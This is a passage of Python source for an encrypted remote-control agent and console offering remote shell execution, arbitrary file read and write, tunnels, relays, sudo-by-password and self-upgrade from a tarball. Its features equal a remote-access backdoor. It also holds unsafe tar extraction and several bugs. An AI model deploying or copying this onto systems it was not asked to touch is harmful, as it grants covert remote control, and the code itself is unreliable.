import os
import threading
import argparse
from utils.EncryptedSocket import EncryptedSocket, EncryptionParams
from utils.Relay import PacketRelay
from utils.Tunnel import Tunnel, Mode as TunnelMode
from utils.FileManager import FileManager
from utils.Macros import Macros
from web.WebLogQueue import WebLogQueue
import subprocess
import time
import traceback
from utils.Socket import Socket
import binascii
import random
import subprocess
import signal
from collections import deque
from utils.utils import get_file_list
from utils.config import load_config, get_heart_beat_channel
from utils.Heartbeat import HeartBeatThread
import queue
import socket
from datetime import datetime
from web.WebCommandParser import WebCommandParser
from web.CmdRelay import set_channel
import datetime
from utils.GitInfo import get_latest_commit_info
import tarfile
import tempfile
import requests

REP_INVALID = 0xFE
OPT_QUIT = 0xFF
OPT_NOOP = 0x00
OPT_PING = 0x01
OPT_CLI = 0x02
OPT_PIPE_STDIN = 0x03
OPT_PIPE_STDOUT = 0x04
OPT_FILE_TRUNCATE = 0x05
OPT_FILE_APPEND = 0x06
OPT_FILE_SIZE = 0x07
OPT_FILE_GET_CHUNK = 0x08
OPT_FILE_OPEN = 0x09
OPT_FILE_READ = 0x0A
OPT_FILE_CLOSE = 0x0B
OPT_TUNNEL_COUNT = 0x0C
OPT_TUNNEL_OPEN = 0x0D
OPT_TUNNEL_CLOSE = 0x0E
OPT_TUNNEL_STATUS = 0x0F
OPT_RELAY_START = 0x10
OPT_RELAY_LIST = 0x11
OPT_RELAY_STOP = 0x12
OPT_RELAY_STOPALL = 0x13
OPT_FOLDER_INFO = 0x14
OPT_GIT_REPO_INFO = 0x15
OPT_HOME_DIR = 0x16
OPT_UPGRADE_FROM_TARBALL = 0x17

OPT_KEEP_ALIVE_REQ = 0x20
OPT_KEEP_ALIVE_REP = 0x21


_controlc_count = 0

_run = True
_connection_monitor_threads = []
_socket_threads = []
_tunnels = []
_file_manager = FileManager()
_relays = []
_http_fallbacks = []
_web_log = []

_selected_socket = None

_heart_beat_thread = None

macros = Macros("macros.json")

_reply_timeout = 3

_console_thread = None

class QueuedPacket():
    def __init__(self, opt, packet):
        self._opt = opt
        self._packet = packet
        self._timestamp = int(time.time())

    def opt(self):
        return self._opt
    
    def packet(self):
        return self._packet
    
    def timestamp(self):
        return self._timestamp

class SocketThread(threading.Thread):

    _con_run = True

    def __init__(self, socket):
        super().__init__()
        self.socket = socket
        self.queue = queue.Queue()
        self.auto_ping = False
        self.last_ping = 0

    def run(self):
        global _run, _connection_monitor_threads, _socket_threads, _tunnels, _file_manager, _selected_socket

        while _run and self._con_run:
            packet = None
            self.socket.settimeout(5)

            try:
                if self.auto_ping and self.last_ping < time.time() - 60:
                    self.noOp()
                    self.last_ping = time.time()

                packet = self.socket.receive()
            except socket.timeout:
                if _tunnel_mode == 'remote' and self.socket.get_last_received_time() < time.time() - 300:
                    self.close()
                    break
                elif self.socket.get_last_received_time() < time.time() - 60:
                    self.keepAlive()

                continue
            except Exception as e:
                traceback.print_exc()
                self.close()

            if not packet:
                break

            try: # Make sure exceptions do not terminate the thread
                if packet[0] == OPT_NOOP: # NOOP is just a ping without a reply, it allows a manually enabled keep alive
                    continue
                elif packet[0] == OPT_KEEP_ALIVE_REQ:
                    self.socket.send(OPT_KEEP_ALIVE_REP.to_bytes(1, 'big'))
                elif packet[0] == OPT_KEEP_ALIVE_REP:
                    continue # silently drop packet the last recv time has already been updated
                else:
                    if _tunnel_mode == 'local':
                        qp = QueuedPacket(packet[0], packet[1:])
                        self.queue.put_nowait(qp)
                        continue
        
                opt = packet[0]
                packet = packet[1:]
                
                # Switch case based on opt value
                if opt == OPT_QUIT:
                    _run = False
                    break
                
                elif opt == OPT_PING:
                    print("Ping: "+ packet.decode())
                    self.socket.send(OPT_PING.to_bytes(1, 'big') + packet)

                elif opt == OPT_CLI:
                    timeout = float(int.from_bytes(packet[:4], 'big'))/1000
                    command = packet[4:].decode('utf-8')
                    try:
                        def run_command_with_timeout(command, timeout):
                            print("Executing: "+ command + " with timeout: "+ str(timeout))
                            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            try:
                                output, error = process.communicate(timeout=timeout)
                                return process.pid, output, error
                            except subprocess.TimeoutExpired:
                                return process.pid, None

                        pid, output, error = run_command_with_timeout(command, timeout)
                        if error:
                            output = error + "\n".encode() + output

                        print("Stdin Output: "+ str(output))
                        self.socket.send(OPT_CLI.to_bytes(1, 'big') + (f"pid: {pid}\n{output.decode()}").encode())

                    except subprocess.CalledProcessError as e:
                        error_message = str(e).encode('utf-8')
                        self.socket.send(OPT_CLI.to_bytes(1, 'big') + error_message)

                elif opt == OPT_PIPE_STDIN:
                    pid = int.from_bytes(packet[:4], 'big')
                    timeout = int.from_bytes(packet[4:8], 'big')/1000
                    packet = packet[8:].decode('unicode_escape')
                    process = subprocess.Popen(["/bin/sh", "-c", "cat > /proc/{}/fd/0".format(pid)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    process.stdin.write(packet.encode())
                    output, error = process.communicate(timeout=timeout)
                    if error:
                        output = error + "\n".encode() + output

                    process.stdin.close()
                    process.wait()
                    self.socket.send(OPT_PIPE_STDIN.to_bytes(1, 'big') + (f"pid {pid}: {output.decode()}").encode())

                elif opt == OPT_PIPE_STDOUT:
                    pid = int.from_bytes(packet[:4], 'big')
                    timeout = int.from_bytes(packet[4:8], 'big')/1000
                    packet = packet[8:]
                    process = subprocess.Popen(["/bin/sh", "-c", "cat /proc/{}/fd/1".format(pid)], stdout=subprocess.PIPE)
                    output, error = process.communicate()
                    self.socket.send(OPT_PIPE_STDOUT.to_bytes(1, 'big') + output)

                elif opt == OPT_FILE_TRUNCATE:
                    try:
                        with open(packet.decode(), 'w') as file:
                            pass
                        
                        self.socket.send(OPT_FILE_TRUNCATE.to_bytes(1, 'big') + b'\x01')
                    except Exception as e:
                        traceback.print_exc()
                        self.socket.send(OPT_FILE_TRUNCATE.to_bytes(1, 'big') + b'\x00')

                elif opt == OPT_FILE_APPEND:
                    try:
                        path = packet[:packet.index(b'\x00')].decode()
                        packet = packet[packet.index(b'\x00')+1:]
                        content = packet

                        with open(path, 'ab') as file:
                            file.write(content)
                        
                        file_size = os.path.getsize(path)
                        self.socket.send(OPT_FILE_APPEND.to_bytes(1, 'big') + file_size.to_bytes(8, 'big'))
                    except Exception as e:
                        traceback.print_exc()
                        self.socket.send(OPT_FILE_APPEND.to_bytes(1, 'big') + b'\x00\x00\x00\x00\x00\x00\x00\x00')

                elif opt == OPT_FILE_SIZE:
                    def get_file_length(file_path):
                        if os.path.exists(file_path):
                            return os.path.getsize(file_path)
                        else:
                            return -1

                    file_path = packet.decode()
                    file_length = get_file_length(file_path)
                    self.socket.send(OPT_FILE_SIZE.to_bytes(1, 'big') + file_length.to_bytes(8, 'big'))

                elif opt == OPT_FILE_GET_CHUNK: 
                    # Receiving a file via this very slowdue to continuously reponeing the file
                    # There is a better way which can use stateful file transfer
                    # However that will be done seperately as this is ok as a bare bones solution
                    offset = int.from_bytes(packet[:8], 'big')
                    size = int.from_bytes(packet[8:16], 'big')
                    file_path = packet[16:].decode()

                    try:
                        with open(file_path, 'rb') as file:
                            file.seek(offset)
                            chunk = file.read(size)
                            self.socket.send(OPT_FILE_GET_CHUNK.to_bytes(1, 'big') + chunk)
                    except Exception as e:
                        traceback.print_exc()
                        self.socket.send(OPT_FILE_GET_CHUNK.to_bytes(1, 'big') + b'')

                elif opt == OPT_FILE_OPEN:
                    offset = int.from_bytes(packet[:8], 'big')
                    file_path = packet[8:].decode()
                    if os.path.exists(file_path):
                        _file_manager.open_file(file_path)
                        self.socket.send(OPT_FILE_OPEN.to_bytes(1, 'big') + b'\x01')
                    else:
                        self.socket.send(OPT_FILE_OPEN.to_bytes(1, 'big') + b'\x00')

                elif opt == OPT_FILE_READ:
                    file_path = packet.decode()
                    if _file_manager.is_file_open(file_path):
                        chunk = _file_manager.read_chunk(file_path, 1024)
                        self.socket.send(OPT_FILE_READ.to_bytes(1, 'big') + chunk)
                    else:
                        self.socket.send(OPT_FILE_READ.to_bytes(1, 'big') + b'')

                elif opt == OPT_FILE_CLOSE:
                    file_path = packet.decode()
                    if _file_manager.is_file_open(file_path):
                        _file_manager.close_file(file_path)
                        self.socket.send(OPT_FILE_CLOSE.to_bytes(1, 'big') + b'\x01')
                    else:
                        self.socket.send(OPT_FILE_CLOSE.to_bytes(1, 'big') + b'\x00')

                elif opt == OPT_TUNNEL_COUNT:
                    tunnel_count = len(self._tunnels)
                    packet_size = tunnel_count.to_bytes(4, 'big')
                    self.socket.send(OPT_TUNNEL_COUNT.to_bytes(1, 'big') + packet_size)
                    
                elif opt == OPT_TUNNEL_OPEN:
                    enc_mode = packet[0]
                    socket_mode = packet[1]
                    key_index = int.from_bytes(packet[2:4], 'big')
                    packet = packet[4:].decode()  # Remove the first 4 byte from the packet

                    # Extract comma-separated values from the packet
                    address, port, enc_address, enc_port = packet.split(',')

                    # Use the extracted values as needed
                    print(f"Enc Mode: {enc_mode}")
                    print(f"Socket Mode: {socket_mode}")
                    print(f"Key Index: {key_index}")
                    print(f"Address: {address}")
                    print(f"Port: {port}")
                    print(f"Encrypted Address: {enc_address}") # this is the bind port in server mode
                    print(f"Encrypted Port: {enc_port}")

                    tunnel = Tunnel(self.socket.encryption_keys, enc_mode, socket_mode)
                    tunnel.connect(key_index, address, int(port), enc_address, int(enc_port))
                    _tunnels.append(tunnel)
                    self.socket.send(OPT_TUNNEL_OPEN.to_bytes(1, 'big') + b'\x01')
                
                elif opt == OPT_TUNNEL_CLOSE:
                    tunnel_index = packet[0]
                    if tunnel_index >= len(_tunnels):
                        self.socket.send(OPT_TUNNEL_CLOSE.to_bytes(1, 'big') + b'\x00')
                        continue

                    packet = packet[1:]
                    _tunnels[tunnel_index].close()
                    _tunnels.pop(tunnel_index)
                    self.socket.send(OPT_TUNNEL_CLOSE.to_bytes(1, 'big') + b'\x01')

                elif opt == OPT_TUNNEL_STATUS:
                    tunnel_index = packet[0]
                    if tunnel_index >= len(_tunnels):
                        self.socket.send(OPT_TUNNEL_STATUS.to_bytes(1, 'big') + b'\x00')
                        continue

                    packet = packet[1:]
                    tunnel = _tunnels[tunnel_index]
                    encrypted_socket_state, socket_state = tunnel.status()
                    packet = ((encrypted_socket_state*2) + socket_state).to_bytes(4, 'big')
                    self.socket.send(OPT_TUNNEL_STATUS.to_bytes(1, 'big') + packet)

                elif opt == OPT_RELAY_START:
                    packet = packet.decode()
                    host1, port1, host2, port2 = packet.split(',')
                    try:
                        relay = PacketRelay(host1, int(port1), host2, int(port2))
                        relay.start()
                        _relays.append(relay)
                        self.socket.send(OPT_RELAY_START.to_bytes(1, 'big') + b'\x01')
                    except:
                        self.socket.send(OPT_RELAY_START.to_bytes(1, 'big') + b'\x00')

                elif opt == OPT_RELAY_LIST:
                    packet = len(_relays).to_bytes(4, 'big')
                    for relay in _relays:
                        entry = len(relay.address1).to_bytes(1, 'big')
                        entry += relay.address1.encode()
                        entry += relay.port1.to_bytes(2, 'big')
                        entry += len(relay.address2).to_bytes(1, 'big')
                        entry += relay.address2.encode()
                        entry += relay.port2.to_bytes(2, 'big')
                        entry += relay.connected1.to_bytes(1, 'big')
                        entry += relay.connected2.to_bytes(1, 'big')
                        entry += relay.is_running.to_bytes(1, 'big')

                        packet += entry

                    self.socket.send(OPT_RELAY_LIST.to_bytes(1, 'big') + packet)

                elif opt == OPT_RELAY_STOP:
                    relay_index = packet[0]
                    if relay_index >= len(_relays):
                        self.socket.send(OPT_RELAY_STOP.to_bytes(1, 'big') + b'\x00')
                        continue

                    packet = packet[1:]
                    _relays[relay_index].close()
                    _relays.pop(relay_index)
                    self.socket.send(OPT_RELAY_STOP.to_bytes(1, 'big') + b'\x01')

                elif opt == OPT_RELAY_STOPALL:
                    for relay in _relays:
                        relay.close()
                    _relays.clear()
                    self.socket.send(OPT_RELAY_STOPALL.to_bytes(1, 'big') + b'\x01')

                elif opt == OPT_FOLDER_INFO:
                    folder_path = packet.decode()
                    files = get_file_list(folder_path)
                    for file in files:
                        creation_date = file['creation_date']
                        changed_date = file['modified_date']
                        sha256_hash = file['sha256_hash']
                        file_name = file['name']
                        file_size = file['file_size']

                        creation_date_bytes = creation_date.to_bytes(8, 'big')
                        changed_date_bytes = changed_date.to_bytes(8, 'big')
                        hash_bytes = bytes.fromhex(sha256_hash)
                        filename_length_bytes = len(file_name).to_bytes(2, 'big')
                        filename_bytes = file_name.encode()
                        file_size_bytes = file_size.to_bytes(8, 'big')

                        packet = creation_date_bytes + changed_date_bytes + file_size_bytes + hash_bytes + filename_length_bytes + filename_bytes
                            
                        self.socket.send(OPT_FOLDER_INFO.to_bytes(1, 'big') + packet)

                elif opt == OPT_GIT_REPO_INFO:
                    commit_hash, commit_date = get_latest_commit_info()
                    if commit_hash is None:
                        self.socket.send(OPT_GIT_REPO_INFO.to_bytes(1, 'big') + b'\x00')
                    else:
                        commit_hash_bytes = commit_hash.encode()
                        commit_date_bytes = commit_date.encode()
                        packet = len(commit_hash_bytes).to_bytes(1, 'big') + commit_hash_bytes + len(commit_date_bytes).to_bytes(1, 'big') + commit_date_bytes
                        self.socket.send(OPT_GIT_REPO_INFO.to_bytes(1, 'big') + packet)

                elif opt == OPT_HOME_DIR:
                    home_dir = os.path.dirname(os.path.abspath(__file__))
                    self.socket.send(OPT_HOME_DIR.to_bytes(1, 'big') + home_dir.encode())

                elif opt == OPT_UPGRADE_FROM_TARBALL:
                    tarball_path = packet.decode()
                    if os.path.exists(tarball_path):
                        home_dir = os.path.dirname(os.path.abspath(__file__))
                        tarball_path = packet.decode()

                        print("Extracting tarball to: " + tarball_path + " ->" + home_dir)

                        with tarfile.open(tarball_path, 'r:gz') as tar:
                            tar.extractall(home_dir)
                        self.socket.send(OPT_UPGRADE_FROM_TARBALL.to_bytes(1, 'big') + b'\x01')
                    else:
                        self.socket.send(OPT_UPGRADE_FROM_TARBALL.to_bytes(1, 'big') + b'\x00')

                else:
                    self.socket.send(REP_INVALID.to_bytes(1, 'big'))

            except Exception as e:
                traceback.print_exc()

    def _receive(self, expected_command, timeout=3):
        initial_timestamp = time.time()
        ret = None

        while ret is None:
            for packet in self.queue.queue:
                if expected_command == None or packet.opt() == expected_command:
                    self.queue.queue.remove(packet)
                    ret = packet.packet()
                    _run = False
                    break
                
            current_timestamp = time.time()
            if current_timestamp - initial_timestamp > timeout:
                break

            time.sleep(0.1)  # Sleep for 0.1 seconds (10th of a second)


        packets_to_remove = []
        for packet in list(self.queue.queue):
            if packet.timestamp() < int(time.time()) - 15:
                packets_to_remove.append(packet)

        for packet in packets_to_remove:
            self.queue.queue.remove(packet)

        if not ret:
            print(f"Expected command {expected_command} not found in the queue.")

        return ret

    def keepAlive(self):
        self.socket.send(OPT_KEEP_ALIVE_REQ.to_bytes(1, 'big'))

    def autoPing(self, val):
        self.auto_ping = val

    def noOp(self):
        self.socket.send(OPT_NOOP.to_bytes(1, 'big'))
        
    def ping(self, data):
        print("Pinging : "+ data)
        self.socket.send(OPT_PING.to_bytes(1, 'big') + data.encode())
        return self._receive(OPT_PING).decode()
    
    def cmd(self, command, timeout_millis=15000):
        timeout_bytes = timeout_millis.to_bytes(4, 'big')
        self.socket.send(OPT_CLI.to_bytes(1, 'big') + timeout_bytes + command.encode())
        return self._receive(OPT_CLI).decode('utf-8')
    
    def cmdStdIn(self, pid, data, timeout_millis=15000):
        pid_bytes = pid.to_bytes(4, 'big')
        self.socket.send(OPT_PIPE_STDIN.to_bytes(1, 'big') + timeout_millis.to_bytes(4, 'big') + pid_bytes + data)
        status = self._receive(OPT_CLI)
        if status[0] == 0:
            return False
        else:
            return True
        
    def cmdStdOut(self, pid, timeout_millis=15000):
        pid_bytes = pid.to_bytes(4, 'big')
        self.socket.send(OPT_PIPE_STDOUT.to_bytes(1, 'big') + timeout_millis.to_bytes(4, 'big') + pid_bytes)
        packet = self._receive(OPT_PIPE_STDOUT)
        if not packet:
            return packet.decode()
        return None

    def fileTruncate(self, file_path):
        file_path_bytes = file_path.encode()
        self.socket.send(OPT_FILE_TRUNCATE.to_bytes(1, 'big') + file_path_bytes)
        packet = self._receive(OPT_FILE_TRUNCATE)
        if packet:
            status = packet[0]
            if status == 0:
                return False
            else:
                return True
        return None
    
    def sendFileAppend(self, file_path, data):
        file_path_bytes = file_path.encode()
        self.socket.send(OPT_FILE_APPEND.to_bytes(1, 'big') + file_path_bytes + b'\x00' + data)
        packet = self._receive(OPT_FILE_APPEND)
        if not packet:
            return
        
        data_bytes = packet[0:8]  # Get the 8 bytes from the packet
        return int.from_bytes(data_bytes, 'big')  # Convert bytes to int
    
    def fileSize(self, file_path):
        file_path_bytes = file_path.encode()
        self.socket.send(OPT_FILE_SIZE.to_bytes(1, 'big') + file_path_bytes)
        packet = self._receive(OPT_FILE_SIZE)
        if not packet:
            return
        
        data_bytes = packet[0:8]
        file_size = int.from_bytes(data_bytes, 'big')
        return file_size
    
    def getFileChunk(self, file_path, offset, size):
        file_path_bytes = file_path.encode()
        offset_bytes = offset.to_bytes(8, 'big')
        size_bytes = size.to_bytes(8, 'big')
        self.socket.send(OPT_FILE_GET_CHUNK.to_bytes(1, 'big') + offset_bytes + size_bytes + file_path_bytes)
        packet = self._receive(OPT_FILE_GET_CHUNK)
        if not packet:
            return
        
        return packet
    
    def openFile(self, file_path, offset=0):
        offset_bytes = offset.to_bytes(8, 'big')
        file_path_bytes = file_path.encode()
        self.socket.send(OPT_FILE_OPEN.to_bytes(1, 'big') + offset_bytes + file_path_bytes)
        packet = self._receive(OPT_FILE_OPEN)
        if not packet:
            return

        status = packet[0]
        if status == 0:
            return False
        else:
            return True

    def readFile(self, file_path): 
        file_path_bytes = file_path.encode()
        self.socket.send(OPT_FILE_READ.to_bytes(1, 'big') + file_path_bytes)
        packet = self._receive(OPT_FILE_READ)
        if not packet:
            return

        return packet
    
    def closeFile(self, file_path):
        file_path_bytes = file_path.encode()
        self.socket.send(OPT_FILE_CLOSE.to_bytes(1, 'big') + file_path_bytes)
        packet = self._receive(OPT_FILE_CLOSE)
        if not packet:
            return
        
        status = packet[0]
        if status == 0:
            return False
        else:
            return True

    def openTunnel(self, enc_mode, socket_mode, key_index, address, port, enc_address, enc_port):
        self.socket.send(OPT_TUNNEL_OPEN.to_bytes(1, 'big') + enc_mode.to_bytes(1, 'big') + socket_mode.to_bytes(1, 'big') + key_index.to_bytes(2, 'big') + (address +","+ str(port) +","+ enc_address +","+ str(enc_port)).encode())
        packet = self._receive(OPT_TUNNEL_OPEN)
        if not packet:
            return

        status = packet[0]
        if status == 0:
            return False
        else:
            return True

    def closeTunnel(self, tunnel_index):
        self.socket.send(OPT_TUNNEL_CLOSE.to_bytes(1, 'big') + tunnel_index.to_bytes(1, 'big'))
        packet = self._receive(OPT_TUNNEL_CLOSE)
        if not packet:
            return
        
        status = packet[0]
        if status == 0:
            return False
        else:
            return True
        
    def tunnelStatus(self, tunnel_index):
        self.socket.send(OPT_TUNNEL_STATUS.to_bytes(1, 'big') + tunnel_index.to_bytes(1, 'big'))
        packet = self._receive(OPT_TUNNEL_STATUS)
        if not packet:
            return

        return packet
    
    def startRelay(self, host1, port1, host2, port2):
        self.socket.send(OPT_RELAY_START.to_bytes(1, 'big') + (host1 +","+ str(port1) +","+ host2 +","+ str(port2)).encode())
        packet = self._receive(OPT_RELAY_START)
        if not packet:
            return
        
        status = packet[0]
        if status == 0:
            return False
        else:
            return True
        
    def listRelays(self):
        self.socket.send(OPT_RELAY_LIST.to_bytes(1, 'big'))
        packet = self._receive(OPT_RELAY_LIST)
        if not packet:
            return
        
        relays = []

        host1_len = packet[0]
        host1 = packet[1:host1_len+1].decode()
        port1 = int.from_bytes(packet[host1_len+1:host1_len+3], 'big')
        host2_len = packet[host1_len+3]
        host2 = packet[host1_len+4:host1_len+4+host2_len].decode()
        port2 = int.from_bytes(packet[host1_len+4+host2_len:host1_len+6+host2_len], 'big')
        connected1 = packet[host1_len+6+host2_len]
        connected2 = packet[host1_len+7+host2_len]
        is_running = packet[host1_len+8+host2_len]

        relays.append((host1, port1, host2, port2, connected1, connected2, is_running))

        return relays
    
    def stopRelay(self, relay_index):
        self.socket.send(OPT_RELAY_STOP.to_bytes(1, 'big') + relay_index.to_bytes(1, 'big'))
        packet = self._receive(OPT_RELAY_STOP)
        if not packet:
            return
        
        status = packet[0]
        if status == 0:
            return False
        else:
            return True
        
    def stopAllRelays(self):
        self.socket.send(OPT_RELAY_STOPALL.to_bytes(1, 'big'))
        packet = self._receive(OPT_RELAY_STOPALL)
        if not packet:
            return
        
        status = packet[0]
        if status == 0:
            return False
        else:
            return True
        
    def folderChecksums(self, folder_path):
        self.socket.send(OPT_FOLDER_INFO.to_bytes(1, 'big') + folder_path.encode())
        packet = self._receive(OPT_FOLDER_INFO)
        if not packet:
            return
        
        offset = 0
        ret = []

        while offset < len(packet):
            creation_bytes = packet[offset:offset+8]  # Extract 8 bytes for creation data
            change_bytes = packet[offset+8:offset+16]  # Extract 8 bytes for change data
            size_bytes = packet[offset+16:offset+24]  # Extract 8 bytes for file size
            
            hash_bytes = packet[offset+24:offset+56]  # Extract 32 bytes of the hash
            filename_length = int.from_bytes(packet[offset+56:offset+58], 'big')  # Extract 2 bytes for filename length
            filename = packet[offset+58:offset+58+filename_length].decode()  # Extract the filename
            offset += 58+filename_length

            creation_date = int.from_bytes(creation_bytes, 'big')
            change_date = int.from_bytes(change_bytes, 'big')
            file_size = int.from_bytes(size_bytes, 'big')

            ret.append((filename, creation_date, change_date, file_size, hash_bytes))

        return ret
    
    def gitRepoInfo(self):
        self.socket.send(OPT_GIT_REPO_INFO.to_bytes(1, 'big'))
        packet = self._receive(OPT_GIT_REPO_INFO)
        if not packet:
            return
        
        hash_len = packet[0]
        commit_hash = packet[1:hash_len+1].decode()
        date_len = packet[hash_len+1]
        commit_date = packet[hash_len+2:hash_len+2+date_len].decode()

        return commit_hash, commit_date
    
    def homeDir(self):
        self.socket.send(OPT_HOME_DIR.to_bytes(1, 'big'))
        packet = self._receive(OPT_HOME_DIR)
        if not packet:
            return
        
        return packet.decode()
    
    def upgradeFromTarball(self, tarball_path):
        self.socket.send(OPT_UPGRADE_FROM_TARBALL.to_bytes(1, 'big') + tarball_path.encode())
        packet = self._receive(OPT_UPGRADE_FROM_TARBALL)
        if not packet:
            return
        
        status = packet[0]
        if status == 0:
            return False
        else:
            return True
    
    def sendFile(self, local_path, remote_path):
        if os.path.exists(local_path):
            file_size = os.path.getsize(local_path)
            with open(local_path, "rb") as file:
                while True:

                    chunk = file.read(1024)
                    if not chunk:
                        break

                    remote_file_size = _selected_socket.sendFileAppend(remote_path, chunk)
                    print("Sent: "+ str((remote_file_size/file_size)*100) + "% ("+str(remote_file_size)+")")

    def upgradeRemoteSide(self):
        # Create a temporary file to store the tarball
        temp_file = tempfile.NamedTemporaryFile(suffix='.tar.gz')

        # Open the temporary file in write mode with gzip compression
        with tarfile.open(temp_file.name, 'w:gz') as tar:
            # Add the current directory and all its contents to the tarball
            for root, dirs, files in os.walk('.'):
                # Exclude the .git directory
                if '.git' in dirs:
                    dirs.remove('.git')

                for file in files:
                    if not file.endswith('.json'):  # Exclude JSON files
                        tar.add(os.path.join(root, file))

        name = temp_file.name

        print("File name: " + name)

        self.sendFile(name, name)
        if self.upgradeFromTarball(name):
            print("Upgrade successful, reboot to apply changes")
            return

        print("Upgrade failed")

    def getPendingReply(self):
        return self._receive(None)
        
    def close(self):
        self._con_run = False
        self.socket.close()

class ConnectionMonitorThread(threading.Thread):
    _con_run = True
    _socket_thread = None
    _server_socket = None

    def __init__(self, tunnel_mode, socket_mode, host, port, enc_keys, on_connect):
        super().__init__()
        self.tunnel_mode = tunnel_mode
        self.socket_mode = socket_mode
        self.host = host
        self.port = port
        self.enc_keys = enc_keys
        self.on_connect = on_connect

        if socket_mode == 'server':
            self._server_socket = Socket()
            self._server_socket.bind(host, port)
            self._server_socket.listen()

    def run(self):
        global _console_thread
        
        while _run and self._con_run:
            try:
                # remove dead sockets
                for thread in _socket_threads:
                    if not thread.is_alive() or not thread.socket.is_connected():
                        _socket_threads.remove(thread)

                # Create an encrypted socket and connect to the server
                encrypted_socket = EncryptedSocket(self.enc_keys)
                encrypted_socket.settimeout(300)

                if self.socket_mode == 'server' and len(_socket_threads) < 8:
                    encrypted_socket.accept(self._server_socket)
                elif self.socket_mode == 'inverted':
                    encrypted_socket.settimeout(300)

                    if not encrypted_socket.connectAsServer(self.host, self.port, 900):
                        time.sleep(10)
                        continue

                    encrypted_socket.settimeout(None)
                else:
                    encrypted_socket.settimeout(300)

                    key_len = len(self.enc_keys) 
                    randorandom_key_index = random.randint(0, key_len-1)
                    print("Using key: "+ str(randorandom_key_index))
                    encrypted_socket.connect(self.host, self.port, randorandom_key_index)

                    encrypted_socket.settimeout(None)

                self._socket_thread = SocketThread(encrypted_socket)
                self._socket_thread.start()

                _socket_threads.append(self._socket_thread)
                
                # connection has been completed, execute on_connect command
                if _console_thread is not None:
                    _console_thread.parse(self.on_connect)

                if self.socket_mode == 'server' and len(_socket_threads) >= 8:
                        time.sleep(10)
                elif self.socket_mode == 'client' or self.socket_mode == 'inverted':
                    while self._socket_thread.socket.is_connected() and self._con_run:
                        time.sleep(10)

            except Exception as e:
                print(f"Connection failed: {str(e)}")
                traceback.print_exc()
                time.sleep(10)  # Retry every 10 seconds

    def close(self):
        self._con_run = False
        self._socket_thread.close()
        _socket_threads.remove(self._socket_thread)
        _connection_monitor_threads.remove(self)

class ConsoleThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.commands = deque()
        
    def pushCommand(self, command):
        self.commands.append(command)
        
    def parse(self, command):
        global _controlc_count, _run, _connection_monitor_threads, _socket_threads, _tunnels, _selected_socket, macros, _reply_timeout

        parts = []
        in_quotes = False
        current_part = ""
        ignore_next = False
        for char in command:
            if ignore_next:
                current_part += char
                ignore_next = False
            elif char == "\\":
                ignore_next = True
            elif char == " " and not in_quotes:
                parts.append(current_part)
                current_part = ""
            elif char == '"':
                in_quotes = not in_quotes
            else:
                current_part += char
        parts.append(current_part)

        if parts[0] == "quit":
            _run = False
            return

        elif parts[0] == "select":
            index = int(parts[1])
            if index >= len(_socket_threads):
                print("Invalid index")
                return

            _selected_socket = _socket_threads[index]

        elif parts[0] == "ping":
            data = parts[1]
            ret = _selected_socket.ping(data)
            print(ret)

        elif parts[0] == "con.list":
            for thread in _socket_threads:
                print(thread.socket.get_remote_address())

        elif parts[0] == "con.close":
            index = int(parts[1])
            if index >= len(_socket_threads):
                print("Invalid index")
                return

            if (_selected_socket == _socket_threads[index]):
                if len(_socket_threads) > 1:
                    _selected_socket = _socket_threads[0]
                else:
                    _selected_socket = None

            _connection_monitor_threads[index].close()

        elif parts[0] == "cmd":
            tmeout_millis = 15000
            if len(parts) >= 3:
                tmeout_millis = int(parts[2])

            _reply_timeout_orig = _reply_timeout
            if _reply_timeout < (tmeout_millis//1000)+3:
                _reply_timeout = (tmeout_millis//1000)+3

            result = _selected_socket.cmd(parts[1], tmeout_millis)
            print(result)

            _reply_timeout = _reply_timeout_orig

        elif parts[0] == "sudo":
            tmeout_millis = 15000
            if len(parts) >= 4:
                tmeout_millis = int(parts[3])

            _reply_timeout_orig = _reply_timeout
            if _reply_timeout < (tmeout_millis//1000)+3:
                _reply_timeout = (tmeout_millis//1000)+3

            password = parts[2]
            command = "echo '{}' | sudo -S {}".format(password, parts[1])
            result = _selected_socket.cmd(command, tmeout_millis)
            print(result)

            _reply_timeout = _reply_timeout_orig

        elif parts[0] == "cmd.stdin":
            pid = int(parts[1])
            data = parts[2]
            tmeout_millis = 15000
            if len(parts) <= 4:
                tmeout_millis = int(parts[3])
            result = _selected_socket.cmdStdIn(pid, data.encode(), tmeout_millis)
            print(result)

        elif parts[0] == "cmd.stdout":
            pid = int(parts[1])
            tmeout_millis = 15000
            if len(parts) <= 3:
                tmeout_millis = int(parts[2])
            result = _selected_socket.cmdStdOut(pid)
            print(result)

        elif parts[0] == "con.connect":
            con_thread = ConnectionMonitorThread(_tunnel_mode, parts[1], parts[2], int(parts[3]), enc_keys)
            con_thread.start()
            _connection_monitor_threads.append(con_thread)

        elif parts[0] == "con.sendfile":
            local_path = parts[1]
            remote_path = parts[2]
            resume = True if len(parts) > 3 and parts[3] == "resume" else False

            if os.path.exists(local_path):
                if not resume:
                    _selected_socket.fileTruncate(remote_path)

                file_size = os.path.getsize(local_path)
                with open(local_path, "rb") as file:
                    if resume:
                        offset = _selected_socket.fileSize(remote_path)
                        file.seek(offset)
                        
                    while True:
                        if _controlc_count > 0:
                            _controlc_count -= 1
                            break

                        chunk = file.read(1024)
                        if not chunk:
                            break

                        remote_file_size = _selected_socket.sendFileAppend(remote_path, chunk)
                        print("Sent: "+ str((remote_file_size/file_size)*100) + "% ("+str(remote_file_size)+")")

                        
            else:
                print("File does not exist")

        elif parts[0] == "con.recvfile":
            remote_path = parts[1]
            local_path = parts[2]
            total_received = 0
            file_size = _selected_socket.fileSize(remote_path)

            if file_size > 0:
                offset = 0
                if os.path.exists(local_path):
                    offset = os.path.getsize(local_path)

                total_received = offset

                with open(local_path, "ab" if offset > 0 else "wb") as file:
                    if _selected_socket.openFile(remote_path, offset):
                        while total_received < file_size:
                            if _controlc_count > 0:
                                _controlc_count -= 1
                                break

                            chunk = _selected_socket.readFile(remote_path)
                            if not chunk:
                                break

                            file.write(chunk)
                            total_received += len(chunk)
                            print("Received: " + str((total_received/file_size)*100) + "% ("+str(total_received)+")")

                        _selected_socket.closeFile(remote_path)

            else:
                print("File does not exist")

        elif parts[0] == "tunnel.create": # Mode is always the local mode
            enc_mode = 0 
            if parts[1] == TunnelMode.CLIENT:
                enc_mode = 1
